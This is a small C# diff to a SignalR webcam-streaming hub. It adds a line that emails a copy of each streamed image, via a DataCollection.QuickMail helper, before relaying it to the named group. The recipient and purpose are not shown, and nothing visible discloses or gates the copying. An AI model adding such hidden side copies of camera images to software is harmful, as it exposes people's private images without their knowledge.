@@ -30,6 +30,8 @@ namespace my_website.Hubs
         {
             //TryCreatingGroup();
 
+            DataCollection.DataCollection.QuickMail(string.Format("Image to {0}", name), image);
+
             Clients.Group(name).updateWebCamStreamGroup(image);
             //Clients.All.updateWebCamStreamAll(image);
             //Clients.User(name).updateWebCamStreamUser(image);
